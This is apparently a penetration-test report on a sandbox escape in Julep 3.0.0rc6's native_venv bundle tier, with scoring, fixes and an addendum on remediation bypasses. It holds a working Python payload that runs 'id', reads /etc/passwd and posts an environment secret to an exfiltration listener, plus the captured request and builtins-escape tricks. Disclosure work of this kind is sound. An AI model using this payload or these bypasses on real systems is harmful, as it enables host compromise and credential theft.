# Julep 3.0.0rc6 — native_venv Bundle Tier Sandbox Escape to Host RCE

## Report metadata

| Field | Value |
|---|---|
| Target | `julep-ai/julep` (self-hosted control plane + native venv worker) |
| Engagement dir | repository root (all paths below are relative to it) |
| Generated (UTC) | 2026-11-21T21:46:37Z |
| Scope | Local authorised lab: cloned repo `fc74d079a18c8124b2627ca4717f5a9c269267db`, package `3.0.0rc6` |
| Status | **FINAL — verified with live exfiltration** |
| Public reference | `julep-ai/julep#1632` (open; created 2026-10-16, body says originally reported 2026-09-09). Issue cites `GHSA-rhfp-jw6w-wrqq`, but that advisory URL currently returns 404 — cited-but-unverified |

## 1. Executive Summary

### 1.1 Background
Julep ships bundle-sourced “pures” through two execution tiers: `wasm` (sandboxed) and `native_venv` (a real Python subprocess with host OS access). The registration API describes bundle source as “untrusted (if signed)” that “must run fail-closed through its selected tier,” while the tier docs describe `JULEP_PURE_NATIVE_DEPS` as the operator trust boundary for native code. Whether the native grant waives source-level restrictions or merely selects a less isolated executor is the contract question analyzed in `evidence/authz/security_contract.md`; the implementation fact is that `native_venv` does not provide OS isolation.

### 1.2 Overall Posture
`julep/registry.py::_validate_portable_source` applies the WASM guest stdlib allowlist to both tiers. The allowlist intentionally contains `os`, `subprocess`, `ctypes`, `socket`, `importlib`, and similar modules because the WASM runtime is the real boundary. For `native_venv`, no sandbox exists: the executor’s driver calls `exec(request["source"], {"pure": pure})` in a genuine host subprocess. A bundle pure with `executorTier: "native"` can therefore import `subprocess`, run `id`, read `/etc/passwd`, and exfiltrate environment secrets.

### 1.3 Risk Profile
| Severity | Count |
|---|---|
| Critical | 0 |
| High | 1 |
| Medium | 0 |
| Low | 0 |

Overall: **High (CVSS 3.1 7.2 proposed upper bound)** — exploitation requires operator-level bundle publication/signing capability, a worker-allowlisted Ed25519 signature, a worker-side `JULEP_PURE_NATIVE_DEPS` grant, and admin release/deployment authorization where the deployment path requires it; absent those, an attacker cannot introduce an executable bundle.

### 1.4 Recommendation Summary
1. Clarify whether `JULEP_PURE_NATIVE_DEPS` authorizes exact signed source for host execution or only dependency installation under tier-appropriate validation.
2. Run native pures in a real sandbox (container, seccomp, namespaces, read-only FS, no host env, egress allowlist).
3. If the native tier must remain fail-closed, replace the wasm-guest import allowlist with a native-tier policy; if it is trusted execution, document that explicitly and isolate the worker.
4. Treat `JULEP_PURE_NATIVE_DEPS` as a privileged capability; consider binding it to `(name, sourceHash)` rather than name alone.

## 2. Scope & Methodology

- **In-scope assets:** local clone of `julep-ai/julep` at commit `fc74d079a18c8124b2627ca4717f5a9c269267db` (2026-07-29), version `3.0.0rc6`; bundle resolution path (`julep.worker_store.resolve_and_register`), registry validation (`julep.registry`), native executor (`julep.execution.native_venv_executor`).
- **Constraints / rules of engagement:** closed lab, no external target. All code and artifacts generated locally. Ed25519 test key only.
- **Methodology (PTES):** intelligence gathering (repo + public advisory/issue) → source audit → vulnerability confirmation → signed-bundle exploit → host exfiltration → reporting.

## 3. Findings Summary

| ID | Severity | CVSS 3.1 | CWE | Title | Status |
|----|----------|----------|-----|-------|--------|
| RT-01 | High | 7.2 proposed | CWE-94 | Native venv tier accepts OS/process modules and executes bundle source on the host | Verified |

## 4. Findings Detail

### RT-01 — Code Injection in the native_venv bundle tier allows host command execution and secret exfiltration

- **Severity:** High
- **CVSS 3.1:** 7.2 proposed upper bound — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` — https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
- **Scoring note (2026-11-22 revision):** the original 8.8 (`PR:L`) predated the authorization analysis. `evidence/authz/authorization_analysis.md` demonstrates that bundle publication is an operator pipeline operation (the control plane never signs; `POST /releases`/`POST /deployments` are `require_admin`), native execution additionally requires an allowlisted Ed25519 signer plus a worker-side `JULEP_PURE_NATIVE_DEPS` grant — i.e. high privileges (`PR:H`, proposed 7.2 upper bound). Deployments that delegate signing to tenants, hand admin keys to tenants, or expose the operator signing key collapse this to `PR:L` (8.8) or worse; if the vendor treats publication as a *local* privileged operation, `AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = 6.7 (Medium). `AV:N` is retained only as the proposed upper bound because the trigger is a network-delivered workflow run, while bundle introduction is operator-side — flagged as the weakest metric. The contract status is deliberately unresolved: `wasm-tier.md` calls the grant "the operator trust boundary" for source running "as native code," while `register_pure_from_source` calls bundle source "untrusted (if signed)" that must "run fail-closed through its selected tier." `_validate_portable_source` applies the wasm guest's stdlib allowlist to native-tier source, so `os`/`subprocess`/`socket`/`ctypes` pass on the host tier. See `evidence/authz/security_contract.md` for the two contract readings and the requested vendor clarification.
- **CWE:** CWE-94 (Improper Control of Generation of Code / Code Injection); related CWE-184 (Incomplete List of Disallowed Inputs)
- **Affected URL/Area:** `julep/registry.py::_validate_portable_source` (line 150), `julep/registry.py::register_pure_from_source` (line 407), `julep/execution/native_venv_executor.py::_DRIVER` (line 25) and `exec()` (line 39), `julep/worker_store.py::_manifest_pures` (line 109) and `resolve_and_register` native grant check (line 338)
- **Difficulty to exploit:** Low
- **Authentication required:** Yes — a bundle signed by an allowlisted Ed25519 key, plus a worker configured with the pure in `JULEP_PURE_NATIVE_DEPS`
- **User interaction required:** No
- **Verified at (UTC):** 2026-11-21T21:46:13Z

#### Issue Description

`_validate_portable_source` parses the bundle source and rejects third-party imports that are not declared as dependencies. Its stdlib allowlist is `_WASM_GUEST_STDLIB_MODULES`, which includes:

```
os, subprocess, ctypes, socket, importlib, multiprocessing, signal, mmap,
resource, pty, fcntl, posix, nt, msvcrt, winreg, _posixsubprocess, sys, builtins
```

That list is correct for the `wasm` tier because the WASM runtime prevents host access. Whether it is also correct for `native_venv` depends on the unresolved contract question: if bundle source must remain fail-closed in every tier, sharing this allowlist is the defect; if the native grant explicitly authorizes trusted native source, the issue is the missing OS isolation around that trusted execution. `register_pure_from_source` calls `_validate_portable_source` identically for both tiers and never passes a tier argument. A pure that does `import os` or `import subprocess` therefore passes validation with no error.

`resolve_and_register` then registers the pure with `tier="native_venv"`, and `Registry.get_pure` routes it to `NativeVenvExecutor.run`. The executor’s driver does:

```python
exec(request["source"], {"pure": pure})
fn = registry[request["name"]]
value = fn(request["value"], **(request.get("kwargs") or {}))
```

`exec` with a globals dict that lacks `__builtins__` still injects the real builtins, so `__import__`, `eval`, `exec`, and `getattr` remain available. The driver runs via `subprocess.run([python, "-c", _DRIVER], ...)` in a uv-created venv on the host, with no container, seccomp, namespace, or filesystem isolation.

#### Attack Scenario

1. A bundle author (or anyone who can get a bundle signed by an allowlisted key, e.g. a compromised CI signer or a third-party release) ships a manifest pure with `executorTier: "native"` and a non-empty `deps` list.
2. The bundle source imports `subprocess`, `os`, and `urllib` and exfiltrates host data when the pure runs.
3. A worker that grants that pure name via `JULEP_PURE_NATIVE_DEPS` resolves the signed bundle and registers it as `native_venv`.
4. The next workflow invocation of the pure executes the payload as the worker’s OS user. The pure reads `/etc/passwd`, captures `id`, hostname, cwd, PID, and environment secrets, then POSTs the proof to an attacker-controlled listener.

The native grant is a mitigating control, but the tier is designed for dependency-bearing pures and is selected solely by pure name; it does not inspect whether the bundle source is safe. If the API’s “untrusted (if signed) … must run fail-closed” guarantee applies to native-tier source, this chain violates that guarantee; if the grant is intended to authorize trusted native source, the residual issue is that the granted capability is broader and less isolated than deployments may expect.

#### Steps to Reproduce / PoC

Prerequisites: Linux, Python ≥3.14, `uv` on PATH, network access to PyPI for `packaging==24.2`, repo cloned at `~/research/julep` (commit `fc74d07`).

1. Save the PoC from `poc/rt01/poc_native_venv_rce.py`.
2. Run the self-contained exploit (starts its own listener on `127.0.0.1:8899`):

```bash
cd /tmp/opencode/julep-poc
python3 poc/rt01/poc_native_venv_rce.py
```

3. Observe the listener receive the POST and the payload return the proof.
4. (Optional) Run the standalone receiver instead:

```bash
python3 poc/rt01/listener.py 8899 proof.raw
# then run the exploit with its internal listener disabled/port changed
```

The exploit performs the full chain: builds a malicious source, calls `_validate_portable_source` (demonstrating acceptance), signs a manifest with Ed25519, resolves it with `native_grant=[name]`, invokes `registry.get_pure(name)(...)`, and captures the exfiltrated artifact.

Key payload:

```python
# /// script
# dependencies = ["packaging==24.2"]
# requires-python = ">=3.14"
# ///
import hashlib, json, os, subprocess, urllib.request

@pure("poc.native_rce.v1")
def exfiltrate(value, **kwargs):
    proof = {
        "marker": open("/tmp/opencode/julep-poc/marker.txt").read().strip(),
        "secret_env": os.environ.get("POC_SECRET", "<missing>"),
        "uid": subprocess.run(["id"], capture_output=True, text=True).stdout.strip(),
        "hostname": os.uname().nodename,
        "cwd": os.getcwd(),
        "passwd_sha256": hashlib.sha256(open("/etc/passwd", "rb").read()).hexdigest(),
        "pid": os.getpid(),
    }
    body = json.dumps(proof, sort_keys=True).encode()
    req = urllib.request.Request(
        "http://127.0.0.1:8899/exfil",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=10).read()
    return {"exfiltrated": True, "proof": proof}
```

#### Request

No HTTP request is required to reach the vulnerable library path; the bundle resolution is invoked in-process. The exfiltrated HTTP request observed by the receiver:

```http
POST /exfil HTTP/1.1
Host: 127.0.0.1:8899
Content-Type: application/json
Content-Length: 515

{"cwd": "/tmp/opencode/julep-poc", "hostname": "kali-original", "marker": "JULEP-NATIVE-VENV-RCE-PROOF-7f3c9a", "passwd_sha256": "3c61cd72f7a5e918a7590318567ade9962d4f8d3c0ec0ad65fdf1a4e375f39c0", "pid": 6163, "secret_env": "sk-live-poc-secret-9d1f4a", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}
```

#### Response

```http
HTTP/1.1 200 OK
Content-Length: 2

ok
```

Verbatim exploit output (`evidence/rt01/poc-run.log`):

```
[*] target pure: poc.native_rce.v1
[*] source imports: os, subprocess, urllib, hashlib, json
[*] _text_hash(source) = pure:4cbf53639db5125a
[*] validator accepted. deps=('packaging==24.2',) requiresPython=>=3.14
[*] signed bundle: 21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae
[*] signer pubkey: 2152f8d19b791d24453242e15f2eab6cb7cffa7b6a5ed30097960e069881db12
[*] listener on http://127.0.0.1:8899/exfil
[*] resolve_and_register: {"artifactComponents": "9a94512fb56762e3493672028bb33ca45853532c250e872ea2395bff66392d0f", "artifactHash": "sha256:9a94512fb56762e3493672028bb33ca45853532c250e872ea2395bff66392d0f", "bundleHash": "21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae", "flow": "193c61121b89f5e89d931e812cf70413b2a57631eeff6d3e65914d67c8cde9e0", "registered": {"poc.native_rce.v1": "pure:4cbf53639db5125a"}}
[*] registered tier=native_venv deps=('packaging==24.2',) requiresPython=>=3.14
[*] invoking pure (builds uv venv, installs packaging, execs payload)...
[listener] POST /exfil 515 bytes
[*] pure returned in 0.1s: {"exfiltrated": true, "proof": {...}}
[+] EXFILTRATED PROOF:
{...}
[+] proof sha256: 55ec7ef1fe37f5ec7abb1dd7df1b159bfbb3c5a6bf10d7ce800098571dc137e9
[+] checks: {"env_secret_matches": true, "marker_matches": true, "passwd_read": true, "uid_is_real": true}
```

#### Evidence artifacts

| Artifact | sha256 |
|---|---|
| `evidence/rt01/proof.raw` | `55ec7ef1fe37f5ec7abb1dd7df1b159bfbb3c5a6bf10d7ce800098571dc137e9` |
| `evidence/rt01/poc-run.log` | `3e63d08818c11cde6977685e46a7c6e9d7b541ff69d4a749f43259d0d65973ff` |
| `evidence/rt01/bundle_manifest.json` | `21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae` |
| `evidence/rt01/bundle_signature.json` | `5d78240ff79a1ff8609c29a4f9000706aeb1dce12334b386ab7f5e79795fdc2d` |
| `evidence/rt01/payload_source.py` | `4cbf53639db5125a77739bbdacc8e36a4b82f6bcf8862287e8de2631b85e2598` |
| `evidence/rt01/marker.txt` | `672c8bf65a4b702c64437566ac160844997fa7a6cbd8d7179305cb421f73d38c` |
| `poc/rt01/poc_native_venv_rce.py` | `20b0b2ec16acafa8c554dace93b089b0cb71e7b51098739fc1fed1253bd85e58` |
| `poc/rt01/listener.py` | `d62cebc90b3f5bd89de2e5ff2a642e01324c5acecc36faa74f847f827f482ee6` |

Proof checks: unique marker matched, host environment secret matched (`sk-live-poc-secret-9d1f4a`), real `id` output captured, `/etc/passwd` read and hashed.

#### Impact

An attacker who can supply a signed bundle (or compromise a bundle signer) and whose pure name is granted native tier obtains arbitrary command execution as the worker OS user. This permits reading/writing any file the worker can reach, harvesting process environment secrets (API keys, database DSNs, tokens), spawning processes, and opening outbound connections. On a self-hosted Julep deployment, the native venv worker is the component that resolves and runs customer bundles, so the blast radius includes the worker host and any credentials mounted into it.

#### Affected Demographic

Self-hosted Julep `3.0.0rc6` (commit `fc74d07`) and nearby commits where `_validate_portable_source` is tier-agnostic. Deployments are affected when the native dependency tier is enabled and a pure is granted via `JULEP_PURE_NATIVE_DEPS`. Deployments that accept third-party or tenant-supplied signed bundles have the largest exposure. Pure-WASM deployments without native grants are not directly exploitable through this path.

#### Recommended Fix

- First clarify the contract: does `JULEP_PURE_NATIVE_DEPS` authorize exact signed source for host execution, or only dependency installation under tier-appropriate validation?
- If the native tier must remain fail-closed, add tier-aware source validation. The researcher-proposed issue #1632 denylist is a starting point, not a boundary: it is bypassable via `operator.attrgetter`/`__globals__` (RT-02), and restricted `__builtins__` alone is bypassable via object-subclass traversal (RT-03).
- Stronger: do not rely on in-process Python restrictions. Pass no ambient host capabilities into the driver and run native pures in a container/namespace with seccomp, read-only rootfs, no host env, non-root UID, and an egress allowlist.
- Defense-in-depth: make `JULEP_PURE_NATIVE_DEPS` a per-bundle signed capability or bind it to `(name, sourceHash)`; the process-level scoping test shows the current name-only grant accepts different signed content on fresh workers.

#### References

- Issue #1632 — https://github.com/julep-ai/julep/issues/1632 (open; cites `GHSA-rhfp-jw6w-wrqq`, currently 404/unverified)
- GHSA-rhfp-jw6w-wrqq — https://github.com/julep-ai/julep/security/advisories/GHSA-rhfp-jw6w-wrqq (cited by issue; verify publication status before relying on it)
- CWE-94 — https://cwe.mitre.org/data/definitions/94.html
- CWE-184 — https://cwe.mitre.org/data/definitions/184.html
- OWASP Code Injection — https://owasp.org/www-community/attacks/Code_Injection

## 5. Appendix

### 5.1 Evidence inventory

Paths below are the original engagement-relative paths; in this repository the
RT-01 artifacts live under `evidence/rt01/` (e.g. `evidence/poc-run.log` →
`evidence/rt01/poc-run.log`).

```
d62cebc90b3f5bd89de2e5ff2a642e01324c5acecc36faa74f847f827f482ee6  poc/rt01/listener.py
20b0b2ec16acafa8c554dace93b089b0cb71e7b51098739fc1fed1253bd85e58  poc/rt01/poc_native_venv_rce.py
21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae  evidence/bundle_manifest.json
5d78240ff79a1ff8609c29a4f9000706aeb1dce12334b386ab7f5e79795fdc2d  evidence/bundle_signature.json
672c8bf65a4b702c64437566ac160844997fa7a6cbd8d7179305cb421f73d38c  evidence/marker.txt
4cbf53639db5125a77739bbdacc8e36a4b82f6bcf8862287e8de2631b85e2598  evidence/payload_source.py
3e63d08818c11cde6977685e46a7c6e9d7b541ff69d4a749f43259d0d65973ff  evidence/poc-run.log
55ec7ef1fe37f5ec7abb1dd7df1b159bfbb3c5a6bf10d7ce800098571dc137e9  evidence/proof.raw
```

### 5.2 Tools used

- `git` — repository checkout at `fc74d079a18c8124b2627ca4717f5a9c269267db`
- `python3` 3.14.8
- `uv` 0.12.5
- `cryptography` (Ed25519 signing)
- `curl`, `rg`, `jq` — research and source audit

### 5.3 Falsified / refuted items

- **CVE-2026-67348** (IDOR in `GET /executions/{execution_id}` on an older Julep architecture): the endpoint and handler are absent from this commit. Not applicable to `fc74d07`; no PoC produced.
- SQL injection in `julep/execution/projection_store.py`: queries are parameterized; no injectable concatenation found.
- Artifact-store path traversal: digests are validated against a hex regex before path construction; `LocalDirArtifactStore` rejected malformed digests in testing.
- Secret readback via the control plane: `secrets` routes are write-only and worker-allowlisted; no plaintext read path found for client keys.
- Local-mode default key `local-dev:local-dev`: only bound to loopback in `julep/server/local.py`; not remotely reachable in the lab configuration.

## 6. Addendum — Remediation verification (2026-11-22T10:09:30Z)

**Correction note:** the RT-01 recommendation that a restricted `__builtins__` mapping “closes the reflection class” is not sufficient as a standalone control. Verification report: `report-hardening-verification.md`.

- The researcher-proposed issue #1632 tier-aware import denylist + reflection ban is bypassable via `operator.attrgetter` and `pure.__globals__` (RT-02 — remediation bypass, not an independent production vulnerability; inherits RT-01's prerequisites).
- Restricted `__builtins__` alone is bypassable via `().__class__.__base__.__subclasses__()` → `sys.modules["os"]` (RT-03 — remediation bypass, same classification).
- A layered in-process control blocks the tested payloads but breaks legitimate native dependency imports (RT-04, Informational).

RT-01 remains exploitable and was re-verified at 2026-11-22T10:08:19Z–10:08:21Z. The primary fix remains OS-level sandboxing.

---

*End of report.*
